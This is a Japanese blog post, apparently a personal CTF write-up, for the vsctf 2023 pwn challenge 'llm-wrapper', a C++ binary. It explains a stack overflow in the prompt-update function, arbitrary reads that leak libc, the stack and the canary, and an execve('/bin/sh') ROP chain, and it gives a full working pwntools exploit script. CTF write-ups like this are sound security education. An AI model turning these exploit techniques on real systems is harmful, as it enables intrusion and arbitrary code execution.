+++
title = "vsctf 2023 | llm-wrapper"
date = 2023-09-29
description = "ノーソースC++問への怒り"
[taxonomies]
tags = ["pwn", "C++", "rop"]
+++

C++の問題が解きたかったので、[vsctf](https://ctftime.org/event/2053)のllm-wrapperを解きました。

<!-- more -->

# llm-wrapper

## 分析

APIトークンとプロンプトを指定してllmと会話ができるバイナリが渡されます。(
実際は用意された文字列をランダムに表示しているだけですが。) C++のバイナリなのにソースコードがついていなくて泣いていました。

セキュリティ機構は以下のとおりです。

- FULL RELRO
- Canaryあり
- NX
- PIE無効

このバイナリの機能としては、最初にAPIトークンの初期化をし、その後

1. プロンプトの実行
2. プロンプトの変更
3. 終了

のいずれかを行うことができます。

## 脆弱性

プロンプトの変更にわかりやすく脆弱性があります。
はじめに`ABCD`を入力し次に`ab`を入力するとプロンプトは`abCD`となります。

このへんの処理を詳しく見るために、`LLM::update_prompt()`の処理を覗いてみます。
`LLM::get_prompt[abi:cxx11]()`で取ってきたStringのポインタに対して改行が入力されるまでコピーを繰り返しているようです。

ということはインライン化されたStringを持ってくるとStack Overflowができそうだとわかります。
C++の構造体の中身についてはptr-yudai氏[^1]の
[こちら](https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732#stdstring)
の記事を参照してください。

実際に以下のように実行するとBoFが起こることが確認できます。

```py
update(b'abc')
update(b'A'*0x100)
fin()
```

{{ image(path="static/img_1.png", caption="BoF発生後のstack") }}

さて、BoFを起こすことができましたが、canaryはオンになっています。
これをリークすることができればROPで任意コード実行に持っていけそうです。

これは難しくなく[^2]、BoFを起こすことができたStringのすぐ下にAPIトークンを持つstringが格納されています。
プロンプトの実行を行うことでAPIトークンを出力させることができるため、
APIトークンのstringが持つポインタを書き換えてしまえばAARが可能になります。

実際に以下のようなコードを実行すると`getchar`のアドレスが出力されていることが確認できます。

```py
update(b'abc')
update(b'A'*0x10 + p64(elf.got('getchar')) + p64(8))
run()
```

{{ image(path="static/img.png", caption="leakの発生") }}

## 攻撃

以下の手順で任意コード実行まで持っていくことができそうです。

1. libcのleak
2. environを用いたstackのleak
3. canaryのleak
4. ROP

まずはヘルパ関数を定義します。

```py
    def run() -> bytes:
        sla(b"choice: ", i2b(1))
        return t.recvuntil(b"1. Run")

    def update(msg: bytes):
        sla(b"choice: ", i2b(2))
        sa(b"ask me?", msg)

    def fin():
        sla(b"choice: ", i2b(3))
```

### libcのleak

PIEが無効なので、上記のようにAPIトークンのポインタをGOTテーブルにしてあげるとlibcのleakができます。

```py
    update(b"ABCD\n")
    update(b"A" * 0x10 + p64(elf.got["getchar"]) + p8(8) + b"\n")
    buf = run()
    info(buf)
    t.interactive()
    buf = buf[buf.find(b"with token ") + 12 :][:8]
    info(f"{buf=:}")
    libc_base = s2u64(buf) - 0x87B60
    success(f"{libc_base=:x}")
```

### stackのleak

libcがleakできているのでAPIトークンのポインタをenvironにしてあげるとstackのleakができます。

```py
    environ = libc_base + 0x221200

    update(b"A" * 0x10 + p64(environ) + p8(8) + b"\n")
    buf = run()
    buf = buf[buf.find(b"with token ") + 12 :][:8]
    stack_base = s2u64(buf)
    success(f"{stack_base=:x}")
```

### canaryのleak

leakしたstackからのオフセットを計算するとcanaryもleakできます。

```py
    canary_addr = stack_base - 0x190
    info(f"{canary_addr=:x}")
    update(b"AAAAAAAA" + p64(wriable_area) + p64(canary_addr) + p8(8) + b"\n")
    buf = run()
    buf = buf[buf.find(b"with token ") + 12 :][:8]
    canary = s2u64(buf)
    success(f"{canary=:x}")
```

### ROP

最後にROPを組めば任意コード実行に持ち込めます。
今回はstackを飛ばす先を考えるのが面倒だったので`system`ではなく`syscall`を使ったROPにしています。

```py
    bin_sh = libc_base + 0x1D8698
    pop_rdi = libc_base + 0x172B79
    pop_rsi = libc_base + 0x173CF0
    pop_rax = libc_base + 0xD9AE2
    pop_rdx_rbx = libc_base + 0x174F96
    syscall = libc_base + 0x128ACA
    rbp = 0
    rop = (
        p64(pop_rdi)
        + p64(bin_sh)
        + p64(pop_rsi)
        + p64(0)
        + p64(pop_rdx_rbx)
        + p64(0)
        + p64(0)
        + p64(pop_rax)
        + p64(59)
        + p64(syscall)
    )
    update(b"\x00" * 0x38 + p64(canary) + p64(0) * 2 + p64(rbp) + rop + b"\n")

    fin()
```

{{ image(path="static/img_2.png", caption="🎉") }}

## スクリプト
最終的なスクリプトが以下です。
```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i : i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process(elf_name, env={"LD_LIBRARY_PATH": "."})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug(
                elf_name, script, env={"LD_LIBRARY_PATH": "."}
            )
    else:
        io: tubes.tube.tube = process(elf_name, env={"LD_LIBRARY_PATH": "."})
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    def run() -> bytes:
        sla(b"choice: ", i2b(1))
        return t.recvuntil(b"1. Run")

    def update(msg: bytes):
        if b"\a" in msg:
            raise Exception("Invalid bytes")
        sla(b"choice: ", i2b(2))
        sa(b"ask me?", msg)

    def fin():
        sla(b"choice: ", i2b(3))

    gen = cyclic_gen()
    sla(b": ", gen.get(8))
    wriable_area = 0x4082E0

    update(b"ABCD\n")
    update(b"A" * 0x10 + p64(elf.got["getchar"]) + p8(8) + b"\n")
    buf = run()
    info(buf)
    buf = buf[buf.find(b"with token ") + 12 :][:8]
    info(f"{buf=:}")
    libc_base = s2u64(buf) - 0x87B60
    success(f"{libc_base=:x}")
    assert not libc_base & 0xFFF

    environ = libc_base + 0x221200

    update(b"A" * 0x10 + p64(environ) + p8(8) + b"\n")
    buf = run()
    buf = buf[buf.find(b"with token ") + 12 :][:8]
    stack_base = s2u64(buf)
    success(f"{stack_base=:x}")

    canary_addr = stack_base - 0x190
    info(f"{canary_addr=:x}")
    update(b"AAAAAAAA" + p64(wriable_area) + p64(canary_addr) + p8(8) + b"\n")
    buf = run()
    buf = buf[buf.find(b"with token ") + 12 :][:8]
    canary = s2u64(buf)
    success(f"{canary=:x}")

    bin_sh = libc_base + 0x1D8698
    pop_rdi = libc_base + 0x172B79
    pop_rsi = libc_base + 0x173CF0
    pop_rax = libc_base + 0xD9AE2
    pop_rdx_rbx = libc_base + 0x174F96
    syscall = libc_base + 0x128ACA
    rbp = 0
    rop = (
        p64(pop_rdi)
        + p64(bin_sh)
        + p64(pop_rsi)
        + p64(0)
        + p64(pop_rdx_rbx)
        + p64(0)
        + p64(0)
        + p64(pop_rax)
        + p64(59)
        + p64(syscall)
    )
    update(b"\x00" * 0x38 + p64(canary) + p64(0) * 2 + p64(rbp) + rop + b"\n")

    fin()
    t.sendline(b"cat flag.txt")

    t.interactive()


local = 0
debug = 1
radare = 0

elf_name = "./llm_wrapper"
libc_name = "./libc.so.6"
remote_addr, remote_port = "vsc.tf 3756".split()
# remote_addr, remote_port = "127.0.0.1 60000".split()
elf: ELF = ELF(elf_name)
libc: ELF = ELF(libc_name)
script = """
b *0x004029b8
"""
t = create_io()
solve()
```

## 終わりに
初めて個人ブログを立ち上げてみました。 zolaを使っているのでビルドがめっちゃ早いです。びっくりしました。


[^1]: このブログは全ページ全pwner読むべきだと思っています

[^2]: libcからTLSへのオフセットが一定だと思っていて、Master Canaryをleakしようとして1時間とかしました(ASLRをオフにしていただけ)
